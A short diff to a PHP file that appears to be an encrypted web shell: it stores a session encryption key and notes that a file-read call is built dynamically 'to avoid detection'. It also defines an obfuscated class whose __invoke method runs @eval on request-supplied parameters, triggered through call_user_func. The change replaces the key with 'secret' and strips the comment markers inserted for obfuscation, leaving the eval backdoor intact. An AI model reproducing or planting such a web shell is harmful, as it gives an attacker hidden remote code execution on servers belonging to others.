@@ -15,7 +15,7 @@ nice
 session_start();
 
 //encryption key
-$key="8335acf1f28f9ae4";
+$key="secret";
 $_SESSION['k']=$key;
 
 //file_get_content dynamically created to avoid detection
@@ -48,11 +48,11 @@ $params=$arr[1];
 
 class GFvTKW88{
 	public function __invoke($p) {
-		@eval("/*Z581i691LB*/".$p."");
+		@eval("\n".$p."\n");
 	}
 }
 
-@call_user_func/*Z581i691LB*/(new GFvTKW88(),$params);
+@call_user_func(new GFvTKW88(),$params);
 ?>
 
 
